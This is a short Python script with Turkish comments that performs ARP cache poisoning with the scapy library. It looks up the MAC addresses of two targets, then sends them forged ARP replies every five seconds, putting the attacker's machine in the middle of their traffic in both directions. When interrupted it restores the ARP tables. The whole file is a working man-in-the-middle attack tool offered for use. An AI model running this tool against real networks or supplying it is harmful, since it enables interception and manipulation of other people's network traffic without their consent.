import scapy.all as scapy
from colorama import *
import time
print(Fore.GREEN)

def get_mac_address(ip):
    #1 -->arp_request
    arp_request_packet = scapy.ARP(pdst=ip)# verilen ip ağı arasında tarama yapmak için bir paket oluşturuldu.
    print("Paket oluşturuluyor...")
    #2 --> broadcast

    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")# bütün mac adreslerine yayın yapması için.

    combined_packet = broadcast_packet/arp_request_packet # iki farklı paketi al ve birleştir.
    print("Paketler birleştiriliyor...")
    answered_list = scapy.srp(combined_packet,timeout=5,verbose=False)[0]#birleştirilmiş paketleri gönderir ve cevap verilmezse devam et anlamında timeout belirledik.
    print("Paketler gönderiliyor...")
    print("Paketler alınıyor...")
    return answered_list[0][1].hwsrc



def arp_poisoner(target_ip,poisoned_ip):

    target_mac = get_mac_address(target_ip)
    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ip)# op --> response olduğunu belirlemek için, # pdst --> hedef ip, hwdst --> hedef mac psrc --> source ip yani modemin ip'si
    scapy.send(arp_response,verbose=False)
def arp_reset(fooled_ip,gateway_ip):
    print("Hedef arp tablosu düzeltildi.")

    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)
    arp_response = scapy.ARP(op=2, pdst=fooled_ip, hwdst=fooled_mac,psrc=gateway_ip,hwsrc=gateway_mac)  # op --> response olduğunu belirlemek için, # pdst --> hedef ip, hwdst --> hedef mac psrc --> source ip yani modemin ip'si

    scapy.send(arp_response, verbose=False,count=5)
    print(Style.RESET_ALL)


target_ip = input("hedef ip'yi girin:")
poisoned_ip = input("Zehirlemek için kullanılacak ip'yi girin:")
print("\t\t\t\t\t\t\t\tÇift taraflı zehirleme adımı")
target_ip2 = input("hedef ip'yi girin:")
poisoned_ip2 = input("Zehirlemek için kullanılacak ip'yi girin:")
print(Style.RESET_ALL)

try:
    while(True):
        arp_poisoner(target_ip,poisoned_ip)
        arp_poisoner(target_ip2,poisoned_ip2)

        time.sleep(5)
except KeyboardInterrupt:
    print("\n Quit & Reset")
    arp_reset(target_ip,poisoned_ip)
    arp_reset(target_ip2,poisoned_ip2)



